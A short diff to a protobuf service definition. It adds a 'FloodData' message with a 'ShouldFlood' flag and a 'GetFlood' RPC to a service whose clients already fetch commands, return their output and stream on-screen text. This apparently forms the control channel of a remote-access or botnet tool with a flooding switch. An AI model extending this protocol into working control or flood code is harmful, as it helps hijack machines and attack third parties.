@@ -22,6 +22,8 @@ message ClientExecOutput {
 
 message Void {}
 
+message FloodData { bool ShouldFlood = 1;}
+
 message ClientDataRequest { string client_id = 1; }
 
 message ClientDataOnScreenTextResponse { ClientOnScreenData on_screen = 1; }
@@ -31,4 +33,5 @@ service Consumer {
     rpc SubscribeOnScreenText(ClientDataRequest) returns (stream ClientDataOnScreenTextResponse);
     rpc GetCommand(ClientDataRequest) returns (ClientExecData);
     rpc SetCommandOutput(ClientExecOutput) returns (Void);
+    rpc GetFlood(ClientDataRequest) returns (FloodData);
 }
